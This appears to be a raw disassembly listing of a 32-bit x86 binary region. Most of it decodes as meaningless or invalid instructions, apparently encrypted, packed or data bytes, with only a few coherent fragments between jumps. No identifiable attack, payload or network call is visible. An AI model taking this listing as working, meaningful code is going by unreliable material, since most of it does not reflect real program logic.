  40de0f:	mov    cl,0x65
  40de11:	pop    esi
  40de12:	lea    eax,[esi+0x53a0e9f9]
  40de18:	sub    BYTE PTR ds:0x80aa70f3,bh
  40de1e:	and    BYTE PTR [eax+0x5b1a5a54],al
  40de24:	jle    0x40de37
  40de26:	and    eax,0x98ef496
  40de2b:	push   es
  40de2c:	pop    ss
  40de2d:	out    dx,eax
  40de2e:	add    DWORD PTR [eax],esi
  40de30:	pop    esp
  40de31:	adc    eax,0xa26300f3
  40de36:	adc    ah,BYTE PTR [ebp+0x6e]
  40de39:	jl     0x40de02
  40de3b:	xor    al,ah
  40de3d:	pop    ecx
  40de3e:	xchg   BYTE PTR [esi-0x3e],dh
  40de41:	jno    0x40de75
  40de43:	mov    bl,0xb3
  40de45:	xchg   ebx,eax
  40de46:	push   ebp
  40de47:	or     DWORD PTR [eax+esi*4],edx
  40de4a:	ss mov bl,0xb8
  40de4d:	cs clc 
  40de4f:	dec    edx
  40de50:	inc    DWORD PTR [ecx]
  40de52:	ss enter 0xc7d7,0x53
  40de57:	dec    eax
  40de58:	aad    0xc7
  40de5a:	mov    edi,0x2ebbc53d
  40de5f:	cmp    edx,DWORD PTR [edi-0x11fa183b]
  40de65:	shl    BYTE PTR [esi-0x3f6a3230],cl
  40de6b:	mov    ah,0x1
  40de6d:	aas    
  40de6e:	shl    DWORD PTR [ebx],1
  40de70:	jo     0x40decf
  40de72:	pop    ebp
  40de73:	jns    0x40debe
  40de75:	xchg   esi,eax
  40de76:	aas    
  40de77:	dec    esi
  40de78:	and    BYTE PTR [ebx+0x56dc2343],bl
  40de7e:	lods   al,BYTE PTR ds:[esi]
  40de7f:	mov    al,ds:0x146edb0a
  40de84:	js     0x40de5a
  40de86:	jbe    0x40de91
  40de88:	jmp    0x1ccbb5b8
  40de8d:	stc    
  40de8e:	mov    ebp,0x6b85e7c6
  40de93:	pusha  
  40de94:	pop    eax
  40de95:	in     al,dx
  40de96:	sbb    edx,DWORD PTR [eax-0x61953677]
  40de9c:	xchg   ebp,eax
  40de9d:	int3   
  40de9e:	push   cs
  40de9f:	inc    esi
  40dea0:	or     al,0x9d
  40dea2:	sub    BYTE PTR [edx],ah
  40dea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dea5:	nop
  40dea6:	mov    eax,DWORD PTR [ecx-0x35]
  40dea9:	ss jae 0x40de8e
  40deac:	dec    ebp
  40dead:	jbe    0x40de71
  40deaf:	mov    ah,0xf1
  40deb1:	cmp    al,0xc9
  40deb3:	and    ebp,DWORD PTR [edi+0x2e]
  40deb6:	adc    al,ch
  40deb8:	stc    
  40deb9:	aas    
  40deba:	test   BYTE PTR [edx-0x49a2d565],ch
  40dec0:	hlt    
  40dec1:	mov    BYTE PTR [ebx-0xd1dfbe0],al
  40dec7:	xlat   BYTE PTR ds:[ebx]
  40dec8:	ret    
  40dec9:	mov    ebp,0x1104e365
  40dece:	jl     0x40df11
  40ded0:	pop    ecx
  40ded1:	xchg   ebp,eax
  40ded2:	add    bh,bl
  40ded4:	neg    bh
  40ded6:	fcom   QWORD PTR [eax+ecx*1-0x3702d0d]
  40dedd:	add    eax,0xb0c1cac1
  40dee2:	xchg   BYTE PTR [ebx+edx*2-0x1c1119ec],ch
  40dee9:	sub    eax,0x71f475c3
  40deee:	dec    ecx
  40deef:	(bad)  
  40def0:	xlat   BYTE PTR ds:[ebx]
  40def1:	push   0x51479932
  40def6:	lds    esi,FWORD PTR [ebp-0x18]
  40def9:	paddusw mm4,QWORD PTR [eax-0x4c79741b]
  40df00:	xor    al,0xef
  40df02:	and    bh,BYTE PTR [eax]
  40df04:	mov    ah,0x14
  40df06:	fadd   QWORD PTR [ecx+ebp*4-0x1b873a6e]
  40df0d:	leave  
  40df0e:	retf   
  40df0f:	aaa    
  40df10:	xchg   ebx,esi
  40df12:	pop    edi
  40df13:	add    ebx,DWORD PTR [edi]
  40df15:	cdq    
  40df16:	cmp    al,0x61
  40df18:	jno    0x40deff
  40df1a:	ficomp DWORD PTR [esi-0x28bb20a9]
  40df20:	es cmp al,0xe4
  40df23:	mov    esp,0xca207265
  40df28:	(bad)  
  40df2a:	add    dl,bl
  40df2c:	and    dh,al
  40df2e:	mov    al,0x4a
  40df30:	in     al,dx
  40df31:	aaa    
  40df32:	sbb    edx,esi
  40df34:	fs jnp 0x40df2f
  40df37:	adc    ah,ah
  40df39:	pop    edi
  40df3a:	loopne 0x40dfb0
  40df3c:	or     al,0x3d
  40df3e:	jns    0x40dfa3
  40df40:	pop    esp
  40df41:	retf   0xa5e0
  40df44:	lock jbe 0x40df12
  40df47:	or     eax,0x3db8ffd
  40df4c:	jno    0x40dfcd
  40df4e:	xor    dl,BYTE PTR [edx-0x7c3e2b8b]
  40df54:	xchg   ecx,eax
  40df55:	push   edx
  40df56:	mov    dx,0xab33
  40df5a:	pop    edx
  40df5b:	lea    esp,[ecx]
  40df5d:	out    dx,al
  40df5e:	int3   
  40df5f:	sub    eax,ebp
  40df61:	sbb    al,ah
  40df63:	and    ebp,DWORD PTR [ebp+0x3f]
  40df66:	pop    ecx
  40df67:	cmp    DWORD PTR [esi+0x11],edx
  40df6a:	shr    BYTE PTR [ebp+0x6b],1
  40df6d:	xchg   esp,esp
  40df6f:	pop    es
  40df70:	pop    ds
  40df71:	mov    dl,0x86
  40df73:	sub    BYTE PTR [esi],bh
  40df75:	into   
  40df76:	push   0xffffffb8
  40df78:	(bad)  
  40df79:	fld    DWORD PTR [edi+0x3e]
  40df7c:	inc    eax
  40df7d:	adc    DWORD PTR [eax+0x1b18ae21],0xffffffea
  40df84:	scas   eax,DWORD PTR es:[edi]
  40df85:	and    al,0x57
  40df87:	jecxz  0x40dfa0
  40df89:	sar    bh,1
  40df8b:	test   DWORD PTR [edi+0x1a7e68e5],0xd47cbef4
  40df95:	bound  edi,QWORD PTR [edx+0x10e08cd1]
  40df9b:	lods   eax,DWORD PTR ds:[esi]
  40df9c:	mov    DWORD PTR [ecx],ebp
  40df9e:	call   0xebac9cb9
  40dfa3:	mov    esi,DWORD PTR [edx+0x5c08393e]
  40dfa9:	call   0x45caa2b1
  40dfae:	lods   al,BYTE PTR ds:[esi]
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x1340413a],1
  40dfde:	xor    al,0x6b
  40dfe0:	xchg   esi,eax
  40dfe1:	mov    BYTE PTR [edx+0x7e357878],dh
  40dfe7:	js     0x40e061
  40dfe9:	mov    bl,0x9d
  40dfeb:	pop    esp
  40dfec:	cmp    dl,al
  40dfee:	mov    ch,0xd5
  40dff0:	icebp  
  40dff1:	sbb    al,0xb7
  40dff3:	arpl   WORD PTR [ebp+ebp*8+0x332fd10c],bx
  40dffa:	xor    esi,DWORD PTR [ebx-0x29]
  40dffd:	cmp    BYTE PTR [edx],bl
  40dfff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e000:	in     eax,0x9
  40e002:	sub    al,0x63
  40e004:	jp     0x40e037
  40e006:	adc    ebp,DWORD PTR [edx+0x5670f803]
  40e00c:	mov    edi,0xcb59c1ed
  40e011:	sti    
  40e012:	lahf   
  40e013:	lds    esp,FWORD PTR [eax+eax*2]
  40e016:	scas   al,BYTE PTR es:[edi]
  40e017:	in     eax,dx
  40e018:	arpl   di,cx
  40e01a:	jnp    0x40e087
  40e01c:	sub    esp,DWORD PTR [esi+0xe6b70a0]
  40e022:	and    al,0x6
  40e024:	sub    BYTE PTR [ecx+0x2a056b22],al
  40e02a:	fistp  QWORD PTR [esi]
  40e02c:	repz in al,dx
  40e02e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e02f:	xor    dh,ah
  40e031:	push   0x32
  40e033:	out    0xea,al
  40e035:	adc    ebp,DWORD PTR [ebx+0x6e820866]
  40e03b:	pop    edx
  40e03c:	pushf  
  40e03d:	and    BYTE PTR [ebx+0x26f3a601],bh
  40e043:	shl    DWORD PTR [ebp+0x72],1
  40e046:	lds    edx,FWORD PTR [edi+0x29]
  40e049:	or     DWORD PTR [esi],ecx
  40e04b:	inc    eax
  40e04c:	rol    bl,1
  40e04e:	lds    esp,FWORD PTR [esi+0x4be2370b]
  40e054:	xchg   ecx,eax
  40e055:	retf   
  40e056:	and    al,0xf7
  40e058:	popf   
  40e059:	inc    edx
  40e05a:	mov    esp,0xaf2f152e
  40e05f:	data16 hlt 
  40e061:	mov    WORD PTR [ebx+0x11886769],ss
  40e067:	add    DWORD PTR [edx],edx
  40e069:	nop
  40e06a:	mov    ebp,0xbf935111
  40e06f:	jmp    0xd9844373
  40e074:	jge    0x40e01c
  40e076:	sbb    DWORD PTR [ebp-0x33],ecx
  40e079:	xchg   edx,eax
  40e07a:	dec    esi
  40e07b:	outs   dx,BYTE PTR ds:[esi]
  40e07c:	mov    ds:0x680966f2,eax
  40e081:	sub    eax,0x70731e3f
  40e086:	outs   dx,BYTE PTR ds:[esi]
  40e087:	iret   
  40e088:	jae    0x40e0c2
  40e08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e08b:	mov    al,0xb9
  40e08d:	outs   dx,DWORD PTR ds:[esi]
  40e08e:	and    bl,BYTE PTR [edi+edi*4]
  40e091:	xor    BYTE PTR [eax],dl
  40e093:	cwde   
  40e094:	xor    al,ch
  40e096:	or     eax,DWORD PTR [esi-0x5b7ee437]
  40e09c:	and    esp,ebp
  40e09e:	jmp    0x40e0b1
  40e0a0:	jnp    0x40e037
  40e0a2:	sbb    esi,DWORD PTR [ebp-0x67]
  40e0a5:	pop    esp
  40e0a6:	push   ss
  40e0a7:	test   DWORD PTR [ebp+0xc],esi
  40e0aa:	les    ebx,FWORD PTR [ebx+eax*8]
  40e0ad:	xor    DWORD PTR [ecx+0x59],edi
  40e0b0:	(bad)  
  40e0b1:	xlat   BYTE PTR ds:[ebx]
  40e0b2:	xor    al,0xb
  40e0b4:	out    dx,eax
  40e0b5:	scas   eax,DWORD PTR es:[edi]
  40e0b6:	push   esi
  40e0b7:	in     eax,0xd0
  40e0b9:	fidiv  WORD PTR [esi+eax*8+0x9]
  40e0bd:	mov    eax,ds:0x32122b1f
  40e0c2:	ja     0x40e0dd
  40e0c4:	test   al,0xdd
  40e0c6:	push   ebp
  40e0c7:	imul   edx,ecx,0x6f713775
  40e0cd:	pop    edx
  40e0ce:	jo     0x40e0ff
  40e0d0:	and    BYTE PTR ds:0x8ea644d0,bh
  40e0d6:	aad    0x25
  40e0d8:	shl    BYTE PTR ds:0xdae8593,1
  40e0de:	into   
  40e0df:	(bad)  
  40e0e0:	and    BYTE PTR [eax+0x5ee24dbd],bl
  40e0e6:	dec    ecx
  40e0e7:	add    al,0xb4
  40e0e9:	mov    ds:0xcbd90830,al
  40e0ee:	add    DWORD PTR [ecx],ebp
  40e0f0:	mov    ebx,0x743c9758
  40e0f5:	imul   ecx,DWORD PTR [eax-0x478fd653],0xc
  40e0fc:	xor    bh,bh
  40e0fe:	clc    
  40e0ff:	xchg   BYTE PTR [esi+0x82f75b9],al
  40e105:	jmp    0x3b4f5a5
  40e10a:	jmp    0x40e174
  40e10c:	test   al,0xc9
  40e10e:	lods   eax,DWORD PTR ds:[esi]
  40e10f:	add    bl,BYTE PTR [ecx+ebp*1-0x357f7f29]
  40e116:	repnz push ecx
  40e118:	xchg   ebx,eax
  40e119:	cwde   
  40e11a:	inc    esi
  40e11b:	add    ch,BYTE PTR [ebx+ebp*4+0x181655ff]
  40e122:	and    BYTE PTR [ecx+0x49d867e2],ch
  40e128:	je     0x40e174
  40e12a:	sbb    DWORD PTR [edx-0x61],eax
  40e12d:	mov    fs,ebx
  40e12f:	clc    
  40e130:	(bad)
  40e133:	repz xor BYTE PTR [ebp-0x46a45e39],cl
  40e13a:	mov    edi,0xc8f91d94
  40e13f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e140:	test   BYTE PTR [esp+ecx*2-0x5f],ah
  40e144:	call   0xf9fc:0x3705917d
  40e14b:	cmc    
  40e14c:	nop
  40e14d:	sub    eax,0x5cb49605
  40e152:	pop    eax
  40e153:	nop
  40e154:	fisubr DWORD PTR [ebx-0x27]
  40e157:	daa    
  40e158:	xor    DWORD PTR [edx+0x23],edi
  40e15b:	popa   
  40e15c:	inc    eax
  40e15d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e15f:	scas   eax,DWORD PTR es:[edi]
  40e160:	fbstp  TBYTE PTR [ebx-0x7a404a27]
  40e166:	(bad)  
  40e167:	and    eax,0x2be7f52e
  40e16c:	cs dec esi
  40e16e:	aas    
  40e16f:	mov    ebx,0x24161bd5
  40e174:	mov    eax,esp
  40e176:	cs cs push cs
  40e179:	nop
  40e17a:	stos   BYTE PTR es:[edi],al
  40e17b:	je     0x40e1eb
  40e17d:	dec    ah
  40e17f:	mov    esi,0xac146438
  40e184:	ja     0x40e132
  40e186:	stos   BYTE PTR es:[edi],al
  40e187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e188:	push   0xce703c1f
  40e18d:	je     0x40e16b
  40e18f:	inc    edx
  40e190:	lahf   
  40e191:	jmp    0xdaea:0xde2a079b
  40e198:	push   esi
  40e199:	jg     0x40e155
  40e19b:	les    edx,FWORD PTR [eax+0x14]
  40e19e:	adc    al,0x8f
  40e1a0:	add    esi,edi
  40e1a2:	cs pop esi
  40e1a4:	ret    0xa20d
  40e1a7:	out    0x82,al
  40e1a9:	cmp    BYTE PTR [edx+0x255841d6],bh
  40e1af:	xchg   edx,eax
  40e1b0:	sub    al,0x58
  40e1b2:	rol    al,cl
  40e1b4:	retf   
  40e1b5:	mov    ebx,0x612d17a0
  40e1ba:	stos   BYTE PTR es:[edi],al
  40e1bb:	sbb    DWORD PTR [ecx+0x2],esi
  40e1be:	repz xchg edi,eax
  40e1c0:	or     al,0x3f
  40e1c2:	lea    esp,[edx+0xdae55a3]
  40e1c8:	test   BYTE PTR ds:0xd359a5b0,al
  40e1ce:	sahf   
  40e1cf:	dec    esi
  40e1d0:	enter  0x3d52,0x90
  40e1d4:	popa   
  40e1d5:	mov    BYTE PTR [eax-0x4aafe2f2],dl
  40e1db:	xchg   ecx,eax
  40e1dc:	mov    esp,0x5af41c9f
  40e1e1:	sbb    BYTE PTR [esi+0x535aa9a5],dl
  40e1e7:	lea    eax,[edx+0x3]
  40e1ea:	adc    bl,BYTE PTR [ebx]
  40e1ec:	dec    ecx
  40e1ed:	ins    BYTE PTR es:[edi],dx
  40e1ee:	mov    esp,0xa713dd9f
  40e1f3:	jle    0x40e182
  40e1f5:	mov    ds:0x54980bb3,eax
  40e1fa:	retf   0x2f54
  40e1fd:	xchg   esp,eax
  40e1fe:	jecxz  0x40e1cc
  40e200:	cmp    BYTE PTR [esp+ebp*4+0x3fadad4e],dh
  40e207:	push   esp
  40e208:	add    esp,DWORD PTR [ecx-0x76]
  40e20b:	shl    DWORD PTR [esi+esi*1+0x261e3fc],0x87
  40e213:	sahf   
  40e214:	out    0xdb,eax
  40e216:	cdq    
  40e217:	pushf  
  40e218:	and    al,0x58
  40e21a:	stc    
  40e21b:	sbb    ah,BYTE PTR [edi-0x64]
  40e21e:	push   eax
  40e21f:	rcr    BYTE PTR cs:[ebx-0x39ccaf78],1
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	lods   al,BYTE PTR ds:[esi]
  40e23b:	add    eax,0xb0455216
  40e240:	js     0x40e2ba
  40e242:	xor    eax,0xcc78787e
  40e247:	xchg   BYTE PTR [ecx-0x50],dl
  40e24a:	imul   ebp,DWORD PTR [ebx+0x3a23e8c8],0x68
  40e251:	sbb    al,BYTE PTR [edi]
  40e253:	jge    0x40e26f
  40e255:	xchg   ebp,eax
  40e256:	repz test al,0x31
  40e259:	lds    edx,FWORD PTR [edi]
  40e25b:	push   edx
  40e25c:	add    eax,0x31788adc
  40e261:	pop    esi
  40e262:	(bad)  
  40e263:	lea    esp,[ecx]
  40e265:	mov    ecx,0x36e4e541
  40e26a:	mov    gs,WORD PTR [ebx]
  40e26c:	mov    DWORD PTR [edx+0x34011e24],esi
  40e272:	xchg   ecx,eax
  40e273:	in     al,dx
  40e274:	sti    
  40e275:	in     eax,0xac
  40e277:	sbb    al,0x64
  40e279:	or     eax,0xa9e1268b
  40e27e:	jbe    0x40e2aa
  40e280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e281:	retf   
  40e282:	scas   al,BYTE PTR es:[edi]
  40e283:	jne    0x40e24f
  40e285:	push   edi
  40e286:	rcr    ebp,cl
  40e288:	inc    ebx
  40e289:	neg    dl
  40e28b:	inc    ebp
  40e28c:	or     BYTE PTR [ebx-0x35],ah
  40e28f:	mov    dl,0x80
  40e291:	pcmpeqw mm0,QWORD PTR [esi]
  40e294:	cmp    al,0xca
  40e296:	mov    esi,0xf32a20c0
  40e29b:	pop    ecx
  40e29c:	fwait
  40e29d:	mov    ebx,0x6665b020
  40e2a2:	mov    ch,0x10
  40e2a4:	(bad)  
  40e2a5:	cmp    al,0x30
  40e2a7:	cli    
  40e2a8:	fdivrp st(5),st
  40e2aa:	jl     0x40e268
  40e2ac:	push   esp
  40e2ad:	popf   
  40e2ae:	loopne 0x40e261
  40e2b0:	sti    
  40e2b1:	jae    0x40e326
  40e2b3:	ror    al,1
  40e2b5:	outs   dx,DWORD PTR ds:[esi]
  40e2b6:	cdq    
  40e2b7:	push   ebx
  40e2b8:	out    dx,eax
  40e2b9:	or     BYTE PTR [edi-0x4334151b],cl
  40e2bf:	xchg   esp,eax
  40e2c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2c1:	pop    esi
  40e2c2:	(bad)  
  40e2c3:	mov    edi,0xa853471e
  40e2c8:	xor    dh,dh
  40e2ca:	fs ins BYTE PTR es:[edi],dx
  40e2cc:	xchg   edx,eax
  40e2cd:	adc    BYTE PTR [ecx-0x42808e33],ch
  40e2d3:	retf   0x33f6
  40e2d6:	nop
  40e2d7:	mov    ds,WORD PTR [edx]
  40e2d9:	std    
  40e2da:	adc    eax,0x1abebfc9
  40e2df:	test   al,0x38
  40e2e1:	pop    ecx
  40e2e2:	(bad)  [eax+0x10fb14ca]
  40e2e8:	shl    al,0x67
  40e2eb:	addr16 adc al,0xb5
  40e2ee:	or     al,0xe6
  40e2f0:	mov    dl,0x46
  40e2f2:	enter  0xfcef,0xb4
  40e2f6:	push   ebx
  40e2f7:	je     0x40e2d8
  40e2f9:	(bad)  
  40e2fa:	dec    ebx
  40e2fb:	test   ch,dl
  40e2fd:	inc    edx
  40e2fe:	sbb    DWORD PTR [edi+ebp*1],0xe4fa6ee2
  40e305:	imul   edi,DWORD PTR [ebp+0x3d],0xd
  40e309:	jge    0x40e2f1
  40e30b:	inc    esi
  40e30c:	jecxz  0x40e2ec
  40e30e:	cmp    al,0xce
  40e310:	cmp    BYTE PTR [eax+edx*2-0x7b],cl
  40e314:	mov    ch,0x8
  40e316:	pop    edi
  40e317:	sub    cl,bh
  40e319:	or     dl,bl
  40e31b:	mov    edx,0xfcfe48a2
  40e320:	and    BYTE PTR [edx-0x1b],0xac
  40e324:	int3   
  40e325:	shl    bh,0xec
  40e328:	dec    esp
  40e329:	jmp    0x40e2e3
  40e32b:	inc    esi
  40e32c:	xor    bl,BYTE PTR [ecx-0x5e]
  40e32f:	nop
  40e330:	add    al,0xda
  40e332:	addr16 xchg edx,eax
  40e334:	dec    esi
  40e335:	iret   
  40e336:	outs   dx,BYTE PTR ds:[esi]
  40e337:	jl     0x40e342
  40e339:	xlat   BYTE PTR ds:[ebx]
  40e33a:	cmp    DWORD PTR [edx],edi
  40e33c:	mov    ebx,0x6ee1fdf7
  40e341:	loopne 0x40e2c9
  40e343:	and    dl,BYTE PTR [edx]
  40e345:	dec    esp
  40e346:	inc    edx
  40e347:	ds cld 
  40e349:	lods   eax,DWORD PTR ds:[esi]
  40e34a:	hlt    
  40e34b:	mov    WORD PTR [edi],?
  40e34d:	mov    ch,0x26
  40e34f:	sbb    al,al
  40e351:	cdq    
  40e352:	clc    
  40e353:	jmp    0x26d:0x6848cf13
  40e35a:	pop    ds
  40e35b:	sub    BYTE PTR [edx+0x29],dh
  40e35e:	push   es
  40e35f:	sbb    BYTE PTR [esi+0x38],dh
  40e362:	stc    
  40e363:	xor    DWORD PTR [edi],esp
  40e365:	sub    esp,edx
  40e367:	xchg   ebp,eax
  40e368:	push   ebx
  40e369:	adc    ah,dh
  40e36b:	xchg   DWORD PTR [esi+0x525b8992],ebp
  40e371:	cmp    dl,BYTE PTR [edx+eax*8-0x5d790b3d]
  40e378:	pop    ss
  40e379:	mov    DWORD PTR [ecx],0xe59005a1
  40e37f:	into   
  40e380:	das    
  40e381:	add    al,0x1b
  40e383:	sub    al,0x61
  40e385:	mov    ah,0x76
  40e387:	test   DWORD PTR [ebx-0x6a],0x5f48bd83
  40e38e:	xchg   BYTE PTR [ebp+ebx*8+0x27de87b0],bl
  40e395:	jae    0x40e39a
  40e397:	adc    esi,DWORD PTR es:[edx+esi*8-0x60f4ba50]
  40e39f:	adc    eax,0x7c0aefa7
  40e3a4:	cli    
  40e3a5:	jg     0x40e390
  40e3a7:	rcl    al,cl
  40e3a9:	xchg   edi,eax
  40e3aa:	retf   
  40e3ab:	mov    edx,0xe697bf0b
  40e3b0:	sub    edi,DWORD PTR [ebx]
  40e3b2:	js     0x40e3a5
  40e3b4:	fcomp  DWORD PTR [esp+ecx*4]
  40e3b7:	push   ecx
  40e3b8:	cmp    edi,ebp
  40e3ba:	loop   0x40e40b
  40e3bc:	sub    cl,cl
  40e3be:	dec    ebp
  40e3bf:	add    edi,DWORD PTR [ecx-0xbfa563]
  40e3c5:	faddp  st(2),st
  40e3c7:	fisttp DWORD PTR [edi]
  40e3c9:	int    0xfa
  40e3cb:	pop    ecx
  40e3cc:	dec    esp
  40e3cd:	and    bl,0x49
  40e3d0:	jge    0x40e3dc
  40e3d2:	fimul  WORD PTR [esp+ebx*1-0x7c951152]
  40e3d9:	add    ebx,edx
  40e3db:	scas   eax,DWORD PTR es:[edi]
  40e3dc:	dec    esi
  40e3dd:	sbb    eax,0x493944a0
  40e3e2:	jg     0x40e368
  40e3e4:	stos   BYTE PTR es:[di],al
  40e3e6:	outs   dx,BYTE PTR ds:[esi]
  40e3e7:	ins    DWORD PTR es:[edi],dx
  40e3e8:	ss scas al,BYTE PTR es:[edi]
  40e3ea:	push   edx
  40e3eb:	mov    dl,0x59
  40e3ed:	stos   DWORD PTR es:[edi],eax
  40e3ee:	ja     0x40e3af
  40e3f0:	cmp    BYTE PTR [eax+0x7ec1871d],ah
  40e3f6:	jne    0x40e3ce
  40e3f8:	scas   eax,DWORD PTR es:[edi]
  40e3f9:	faddp  st(1),st
  40e3fb:	mov    ecx,0x8c450a5e
  40e400:	mov    edi,0xb6c50ae3
  40e405:	shl    DWORD PTR [eax],cl
  40e407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e408:	add    DWORD PTR ds:0x45c83a69,ebx
  40e40e:	push   ebx
  40e40f:	icebp  
  40e410:	pop    ebx
  40e411:	fwait
  40e412:	(bad)  
  40e413:	loope  0x40e3e6
  40e415:	inc    ecx
  40e416:	and    al,0x4e
  40e418:	repnz inc esp
  40e41a:	add    BYTE PTR [esi+edx*2-0x7b],cl
  40e41e:	and    ch,BYTE PTR [ebx+0x4a20ef10]
  40e424:	push   ecx
  40e425:	rcr    DWORD PTR [esi+esi*4],1
  40e428:	arpl   WORD PTR [ebp+esi*1+0x75],cx
  40e42c:	add    al,0x11
  40e42e:	dec    ecx
  40e42f:	lea    esi,[eax-0xd]
  40e432:	out    dx,eax
  40e433:	or     DWORD PTR ds:0xbecefa94,0xc627b566
  40e43d:	xchg   ecx,eax
  40e43e:	push   ebp
  40e43f:	mov    ebp,0xc7139148
  40e444:	mov    edx,0x2af0762b
  40e449:	outs   dx,BYTE PTR ds:[esi]
  40e44a:	rcr    DWORD PTR [edx+0x5d2a2d89],1
  40e450:	push   edi
  40e451:	ret    
  40e452:	pop    eax
  40e453:	(bad)  
  40e454:	imul   ebx,DWORD PTR [edx-0x2e],0xffffff92
  40e458:	bnd call 0x1c27a64d
  40e45e:	inc    DWORD PTR [ecx-0x14fd1499]
  40e464:	cmp    al,0xfb
  40e466:	jecxz  0x40e4a7
  40e468:	jbe    0x40e4c6
  40e46a:	mov    bh,0x88
  40e46c:	inc    DWORD PTR [esp+esi*2+0x5d6b7bb4]
  40e473:	retf   0xba3d
  40e476:	inc    esi
  40e477:	stc    
  40e478:	push   ecx
  40e479:	lahf   
  40e47a:	imul   edx,DWORD PTR [eax-0x44eb1479],0xffffffc7
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ebx,DWORD PTR [ebx]
  40e4b8:	mov    edx,0xb502e226
  40e4bd:	js     0x40e537
  40e4bf:	xor    eax,0x7478787e
  40e4c4:	cdq    
  40e4c5:	popa   
  40e4c6:	push   ds
  40e4c7:	dec    edx
  40e4c8:	std    
  40e4c9:	xor    cl,BYTE PTR [edx+0x6f]
  40e4cc:	leave  
  40e4cd:	adc    al,0xb1
  40e4cf:	pop    eax
  40e4d0:	adc    BYTE PTR [edi+0x28112d9c],bl
  40e4d6:	arpl   WORD PTR [ebx-0x3c176af1],ax
  40e4dc:	cmp    cl,bl
  40e4de:	add    esp,esp
  40e4e0:	push   cs
  40e4e1:	jno    0x40e55c
  40e4e3:	(bad)  
  40e4e4:	(bad)  
  40e4e6:	pop    ebp
  40e4e7:	shl    DWORD PTR [edi+0x70cfb2f0],0xd6
  40e4ee:	imul   ecx,ebx,0x39c0bf8a
  40e4f4:	push   esp
  40e4f5:	pop    edx
  40e4f6:	rcl    DWORD PTR [ecx-0x92e7be8],1
  40e4fc:	xchg   esi,eax
  40e4fd:	xchg   esi,eax
  40e4fe:	imul   ebp,DWORD PTR ds:0x974da7e4,0xa8288920
  40e508:	ja     0x40e517
  40e50a:	leave  
  40e50b:	mov    dh,0x2d
  40e50d:	jle    0x40e52a
  40e50f:	sub    ch,BYTE PTR [esi-0x80]
  40e512:	mov    dh,0x99
  40e514:	test   al,0xca
  40e516:	shl    ch,cl
  40e518:	mov    ebx,0x7cb79c0d
  40e51d:	retf   
  40e51e:	(bad)  
  40e520:	dec    eax
  40e521:	pop    ss
  40e522:	sbb    DWORD PTR [ebx+0x2d],0xb1a8a78f
  40e529:	stc    
  40e52a:	pop    edi
  40e52b:	dec    esp
  40e52c:	pop    eax
  40e52d:	sub    BYTE PTR [ebp-0xcf07497],0x7d
  40e534:	scas   eax,DWORD PTR es:[edi]
  40e535:	cmp    BYTE PTR [ecx+0x0],dl
  40e538:	xchg   dl,ch
  40e53a:	push   edx
  40e53b:	add    al,0xb1
  40e53d:	rcr    BYTE PTR [ebx+0x4d],1
  40e540:	fidiv  WORD PTR [ebp-0x36]
  40e543:	xchg   edi,eax
  40e544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e545:	sub    ebx,DWORD PTR [ebp-0x38959230]
  40e54b:	pop    esi
  40e54c:	(bad)  
  40e54d:	mov    bl,0xd9
  40e54f:	ds ret 
  40e551:	test   eax,0xd1d187a5
  40e556:	stos   DWORD PTR es:[edi],eax
  40e557:	sbb    ebp,DWORD PTR [edx]
  40e559:	lahf   
  40e55a:	cdq    
  40e55b:	jl     0x40e5a4
  40e55d:	xchg   esp,eax
  40e55e:	mov    ebx,0xe25131a8
  40e563:	repz mov ch,al
  40e566:	jp     0x40e592
  40e568:	mov    WORD PTR [ebp+0x20],es
  40e56b:	jmp    0xf67c1578
  40e570:	add    edi,DWORD PTR [edx]
  40e572:	push   edi
  40e573:	pop    edi
  40e574:	and    eax,0xc475f49
  40e579:	(bad)  
  40e57a:	nop
  40e57b:	and    edi,edi
  40e57d:	adc    ecx,DWORD PTR [esi]
  40e57f:	pop    edi
  40e580:	jg     0x40e5d2
  40e582:	mov    esi,0x1a3eb669
  40e587:	jmp    0xfb70c71b
  40e58c:	int    0xf0
  40e58e:	popf   
  40e58f:	jmp    0x40e608
  40e591:	fild   WORD PTR [ecx+eiz*4]
  40e594:	lods   al,BYTE PTR ds:[esi]
  40e595:	sub    al,0x77
  40e597:	or     bh,ah
  40e599:	mov    bl,0xaf
  40e59b:	xchg   esi,eax
  40e59c:	adc    al,0xa5
  40e59e:	shr    BYTE PTR [edi+0x67],1
  40e5a1:	jecxz  0x40e604
